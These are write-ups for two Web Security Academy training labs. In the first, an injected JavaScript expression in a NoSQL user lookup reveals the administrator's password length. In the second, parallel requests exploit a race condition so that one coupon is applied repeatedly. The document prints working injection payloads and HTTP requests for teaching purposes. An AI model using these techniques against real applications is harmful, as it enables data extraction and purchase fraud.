# Web Security Academy Lab Writeups

## 1. Exploiting NoSQL operator injection to extract data

### Objective

Exploit a NoSQL injection vulnerability in the user lookup functionality to retrieve information about the administrator account and determine the administrator password length.

### Steps

1. Log in to the lab and identify the user lookup functionality.

2. Intercept the request using Burp Suite and send it to Repeater.

3. The original request looks like:

```http
GET /user/lookup?user=wiener HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<SESSION>
```

4. The normal response returns the details of the `wiener` user:

```json
{
    "username": "wiener",
    "email": "wiener@normal-user.net",
    "role": "user"
}
```

5. Test the `user` parameter for NoSQL injection.

6. Modify the parameter with the following payload:

```text
administrator'+%26%26+this.password.length%3c+30%26%26+'a'=='b
```

7. The decoded expression is:

```javascript
administrator' && this.password.length < 30 && 'a' == 'b
```

8. The server returns the administrator account:

```json
{
    "username": "administrator",
    "email": "admin@normal-user.net",
    "role": "administrator"
}
```

9. This confirms that the NoSQL query can be manipulated using JavaScript expressions.

10. The same technique can be used to determine the administrator password length by changing the length condition.

11. For example:

```text
administrator'+%26%26+this.password.length%3c+30%26%26+'a'=='b
```

12. Different password-length values can be tested. Burp Intruder can be used to automate this process.

13. When the response changes, the condition has evaluated differently, allowing the password length to be determined.

### Vulnerability

The application incorporates user-controlled input directly into a NoSQL query that supports JavaScript expressions.

An attacker can inject expressions such as:

```javascript
' && this.password.length < 30 && 'a' == 'b
```

This allows conditions on database fields to be evaluated and sensitive information to be extracted.

### Key Takeaway

NoSQL injection can occur when applications construct database queries directly from untrusted user input. If JavaScript expressions are supported by the underlying database, an attacker may be able to use conditional expressions to extract information from database records.


## 2. Limit overrun race conditions

### Objective

Exploit a race condition in the coupon functionality to apply the same coupon multiple times before the application records that it has already been used.

### Initial State

The cart contains:

```text
Product: Lightweight "33t" Leather Jacket
Price: $1337.00
Quantity: 1
```

The available coupon is:

```text
PROMO20
```

The coupon normally provides a 20% discount.

### Normal Coupon Request

The request for applying the coupon is:

```http
POST /cart/coupon HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<SESSION>
Content-Type: application/x-www-form-urlencoded

csrf=<CSRF-TOKEN>&coupon=PROMO20
```

When the coupon has already been applied, the server responds with:

```http
HTTP/2 302 Found
Location: /cart?couponError=COUPON_ALREADY_APPLIED&coupon=PROMO20
```

The response body indicates:

```text
Coupon already applied
```

This shows that the application normally prevents the coupon from being applied more than once.

### Exploitation

1. Send the coupon request to Burp Suite Repeater.

2. Create multiple copies of the same request in a Repeater group.

3. Configure the requests to be sent in parallel.

4. Send the requests simultaneously.

5. The goal is to make multiple requests reach the vulnerable coupon logic at approximately the same time.

6. The application checks whether the coupon has already been applied before applying it.

7. Because multiple requests are processed concurrently, several requests can pass the check before the application updates the coupon state.

8. Successful requests return:

```http
HTTP/2 302 Found
Location: /cart
```

with:

```text
Coupon applied
```

### Before Exploitation

The cart initially showed:

```text
Product price: $1337.00
Coupon discount: -$267.40
Total: $1069.60
```

### After Exploitation

After sending the coupon requests in parallel, the coupon was applied multiple times:

```text
Product price: $1337.00
Coupon discount: -$1321.60
Total: $15.40
```

The same `PROMO20` coupon was therefore applied repeatedly.

### Why the Race Condition Works

The vulnerable logic can be represented as:

```text
1. Check whether the coupon has already been applied.
2. If it has not been applied, apply the coupon.
3. Record that the coupon has been applied.
```

With concurrent requests, the operations can overlap:

```text
Request 1 -> Check coupon -> Not applied
Request 2 -> Check coupon -> Not applied
Request 3 -> Check coupon -> Not applied
                    |
                    v
          Multiple requests apply coupon
```

The application does not make the check-and-update operation atomic.

### Vulnerability

The application contains a race condition because multiple concurrent requests can pass the coupon validation before the server updates the state indicating that the coupon has already been used.

### Key Takeaway

A race condition occurs when the result of an operation depends on the timing or ordering of concurrent requests.

In this lab, the lack of proper synchronization allows the same coupon to be processed multiple times, resulting in an excessive discount.


## Burp Suite Techniques Used

### Repeater

Used to modify and resend HTTP requests manually.

### Intruder

Used to automate testing of different values, such as password-length conditions in the NoSQL injection lab.

### Parallel Requests

Used to send multiple coupon requests at approximately the same time in the race-condition lab.


## Vulnerabilities Demonstrated

- NoSQL injection
- JavaScript expression injection
- Information disclosure through conditional queries
- Race conditions
- Business logic flaws
- Improper synchronization of concurrent requests
